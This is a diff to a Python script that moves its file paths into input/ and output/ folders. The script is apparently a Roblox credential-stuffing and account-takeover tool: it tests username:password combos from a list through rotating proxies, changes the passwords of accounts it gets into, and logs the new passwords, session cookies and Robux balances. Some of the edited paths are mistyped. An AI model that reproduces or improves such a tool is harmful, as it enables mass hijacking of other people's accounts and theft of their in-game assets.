@@ -15,7 +15,7 @@ import json
 import discord_webhook
 from datetime import datetime
 
-config = json.loads(open("config.json").read())
+config = json.loads(open("input/config.json").read())
 
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
 THREAD_COUNT = config["threads"]
@@ -33,7 +33,7 @@ while True:
 
     if str(answer).lower() == 'yes':
 
-        open("checked.txt", "w", encoding="utf-8").write("")
+        open("output/checked.txt", "w", encoding="utf-8").write("")
 
         break
 
@@ -47,7 +47,7 @@ while True:
 
         answer = input("Would you like to clear checked.txt from last time. Say yes if you're checking a new list. Say no if you're continuing to check a previous list. ")
 
-with open("checking.txt", "w", encoding="utf-8") as file:
+with open("output/checking.txt", "w", encoding="utf-8") as file:
 
     file.write("")
 
@@ -253,7 +253,7 @@ class Changer:
 
     def getRandomProxy(self):
 
-        with open("proxies.txt", "r", encoding="utf-8") as file:
+        with open("input/proxies.txt", "r", encoding="utf-8") as file:
 
             lines = file.readlines()
 
@@ -277,7 +277,7 @@ class Changer:
         
     def getCombo(self):
 
-        with open("accounts.txt", "r", encoding="utf-8") as file:
+        with open("input/accounts.txt", "r", encoding="utf-8") as file:
 
             lines = file.readlines()
 
@@ -289,7 +289,7 @@ class Changer:
 
             account = random.choice(accounts).strip("\n")
 
-            if account not in open("checked.txt", "r", encoding="utf-8").read() and account not in open("checking.txt", "r", encoding="utf-8").read():
+            if account not in open("output/checked.txt", "r", encoding="utf-8").read() and account not in open("output/checking.txt", "r", encoding="utf-8").read():
 
                 return account.split(":")[0], account.split(":")[1]
 
@@ -299,13 +299,13 @@ class Changer:
 
             try:
 
-                with open("checked.txt", "r", encoding="utf-8") as file:
+                with open("output/checked.txt", "r", encoding="utf-8") as file:
 
                     lines = file.readlines()
 
                     file.close()
 
-                with open("accounts.txt", "r", encoding="utf-8") as file:
+                with open("input/accounts.txt", "r", encoding="utf-8") as file:
 
                     lines2 = file.readlines()
 
@@ -319,7 +319,7 @@ class Changer:
 
                 with self.lock:
 
-                    with open("checking.txt", "a", encoding="utf-8") as file:
+                    with open("output/checking.txt", "a", encoding="utf-8") as file:
 
                         file.write(f"{username}:{password}\n")
 
@@ -382,7 +382,7 @@ class Changer:
 
                     with self.lock:
 
-                        with open("checking.txt", 'r') as file:
+                        with open("output/checking.txt", 'r') as file:
 
                             lines = file.readlines()
 
@@ -390,19 +390,19 @@ class Changer:
 
                             file.close()
 
-                        with open("checking.txt", 'w') as file:
+                        with open("output/checking.txt", 'w') as file:
 
                             file.writelines(lines)
 
                             file.close()
 
-                        with open("2fa.txt", "a", encoding="utf-8") as file:
+                        with open("output/2fa.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
                             file.close()
 
-                        with open("checked.txt", "a", encoding="utf-8") as file:
+                        with open("ouput/checked.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
@@ -418,7 +418,7 @@ class Changer:
 
                     with self.lock:
 
-                        with open("checking.txt", 'r') as file:
+                        with open("output/checking.txt", 'r') as file:
 
                             lines = file.readlines()
 
@@ -426,13 +426,13 @@ class Changer:
 
                             file.close()
 
-                        with open("checking.txt", 'w') as file:
+                        with open("output/checking.txt", 'w') as file:
 
                             file.writelines(lines)
 
                             file.close()
 
-                        with open("checked.txt", "a", encoding="utf-8") as file:
+                        with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
@@ -499,7 +499,7 @@ class Changer:
 
                     with self.lock:
 
-                        with open("checking.txt", 'r') as file:
+                        with open("output/checking.txt", 'r') as file:
 
                             lines = file.readlines()
 
@@ -507,19 +507,19 @@ class Changer:
 
                             file.close()
 
-                        with open("checking.txt", 'w') as file:
+                        with open("output/checking.txt", 'w') as file:
 
                             file.writelines(lines)
 
                             file.close()
 
-                        with open("2fa.txt", "a", encoding="utf-8") as file:
+                        with open("output/2fa.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
                             file.close()
 
-                        with open("checked.txt", "a", encoding="utf-8") as file:
+                        with open("outputchecked.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
@@ -531,7 +531,7 @@ class Changer:
 
                     with self.lock:
 
-                        with open("checking.txt", 'r') as file:
+                        with open("output/checking.txt", 'r') as file:
 
                             lines = file.readlines()
 
@@ -539,13 +539,13 @@ class Changer:
 
                             file.close()
 
-                        with open("checking.txt", 'w') as file:
+                        with open("output/checking.txt", 'w') as file:
 
                             file.writelines(lines)
 
                             file.close()
 
-                        with open("checked.txt", "a", encoding="utf-8") as file:
+                        with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
@@ -557,7 +557,7 @@ class Changer:
 
                     with self.lock:
 
-                        with open("checking.txt", 'r') as file:
+                        with open("output/checking.txt", 'r') as file:
 
                             lines = file.readlines()
 
@@ -565,13 +565,13 @@ class Changer:
 
                             file.close()
 
-                        with open("checking.txt", 'w') as file:
+                        with open("output/checking.txt", 'w') as file:
 
                             file.writelines(lines)
 
                             file.close()
 
-                        with open("checked.txt", "a", encoding="utf-8") as file:
+                        with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
@@ -628,7 +628,7 @@ class Changer:
 
                                 with self.lock:
 
-                                    with open("checking.txt", 'r') as file:
+                                    with open("output/checking.txt", 'r') as file:
 
                                         lines = file.readlines()
 
@@ -636,13 +636,13 @@ class Changer:
 
                                         file.close()
 
-                                    with open("checking.txt", 'w') as file:
+                                    with open("output/checking.txt", 'w') as file:
 
                                         file.writelines(lines)
 
                                         file.close()
 
-                                    with open("checked.txt", "a", encoding="utf-8") as file:
+                                    with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                                         file.write(f"{username}:{password}\n")
 
@@ -650,7 +650,7 @@ class Changer:
 
                                 with self.lock:
 
-                                    with open("changed.txt", "a", encoding="utf-8") as file:
+                                    with open("output/changed.txt", "a", encoding="utf-8") as file:
 
                                         file.write(f"{username}:{newPass}:{accountCookie}\n")
 
@@ -672,7 +672,7 @@ class Changer:
 
                                         if int(robux) > 0:
 
-                                            with open(f'robux{str(robux)}.txt', "a", encoding="utf-8") as file:
+                                            with open(f'output/robux{str(robux)}.txt', "a", encoding="utf-8") as file:
 
                                                 file.write(f"{username}:{newPass}:{accountCookie}\n")
 
@@ -718,7 +718,7 @@ class Changer:
 
                                 with self.lock:
 
-                                    with open("checking.txt", 'r') as file:
+                                    with open("output/checking.txt", 'r') as file:
 
                                         lines = file.readlines()
 
@@ -726,13 +726,13 @@ class Changer:
 
                                         file.close()
 
-                                    with open("checking.txt", 'w') as file:
+                                    with open("output/checking.txt", 'w') as file:
 
                                         file.writelines(lines)
 
                                         file.close()
 
-                                    with open("checked.txt", "a", encoding="utf-8") as file:
+                                    with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                                         file.write(f"{username}:{password}\n")
 
@@ -740,7 +740,7 @@ class Changer:
 
                                 with self.lock:
 
-                                    with open("changedButError.txt", "a", encoding="utf-8") as file:
+                                    with open("output/changedButError.txt", "a", encoding="utf-8") as file:
 
                                         file.write(f"{username}:{newPass}\n")
 
@@ -750,7 +750,7 @@ class Changer:
 
                             with self.lock:
 
-                                with open("checking.txt", 'r') as file:
+                                with open("output/checking.txt", 'r') as file:
 
                                     lines = file.readlines()
 
@@ -758,13 +758,13 @@ class Changer:
 
                                     file.close()
 
-                                with open("checking.txt", 'w') as file:
+                                with open("output/checking.txt", 'w') as file:
 
                                     file.writelines(lines)
 
                                     file.close()
 
-                                with open("checked.txt", "a", encoding="utf-8") as file:
+                                with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                                     file.write(f"{username}:{password}\n")
 
@@ -772,7 +772,7 @@ class Changer:
 
                             with self.lock:
 
-                                with open("validButError.txt", "a", encoding="utf-8") as file:
+                                with open("output/validButError.txt", "a", encoding="utf-8") as file:
 
                                     file.write(f"{username}:{password}\n")
 
@@ -782,7 +782,7 @@ class Changer:
 
                         with self.lock:
 
-                            with open("checking.txt", 'r') as file:
+                            with open("output/checking.txt", 'r') as file:
 
                                 lines = file.readlines()
 
@@ -790,13 +790,13 @@ class Changer:
 
                                 file.close()
 
-                            with open("checking.txt", 'w') as file:
+                            with open("output/checking.txt", 'w') as file:
 
                                 file.writelines(lines)
 
                                 file.close()
 
-                            with open("checked.txt", "a", encoding="utf-8") as file:
+                            with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                                 file.write(f"{username}:{password}\n")
 
@@ -804,7 +804,7 @@ class Changer:
 
                         with self.lock:
 
-                            with open("validButError.txt", "a", encoding="utf-8") as file:
+                            with open("output/validButError.txt", "a", encoding="utf-8") as file:
 
                                 file.write(f"{username}:{password}\n")
 
@@ -814,7 +814,7 @@ class Changer:
 
                     with self.lock:
 
-                        with open("checking.txt", 'r') as file:
+                        with open("output/checking.txt", 'r') as file:
 
                             lines = file.readlines()
 
@@ -822,13 +822,13 @@ class Changer:
 
                             file.close()
 
-                        with open("checking.txt", 'w') as file:
+                        with open("output/checking.txt", 'w') as file:
 
                             file.writelines(lines)
 
                             file.close()
 
-                        with open("checked.txt", "a", encoding="utf-8") as file:
+                        with open("output/checked.txt", "a", encoding="utf-8") as file:
 
                             file.write(f"{username}:{password}\n")
 
@@ -836,7 +836,7 @@ class Changer:
 
             except Exception as e:
 
-                with open("checking.txt", 'r') as file:
+                with open("output/checking.txt", 'r') as file:
 
                     lines = file.readlines()
 
@@ -844,7 +844,7 @@ class Changer:
 
                     file.close()
 
-                with open("checking.txt", 'w') as file:
+                with open("output/checking.txt", 'w') as file:
 
                     file.writelines(lines)
 
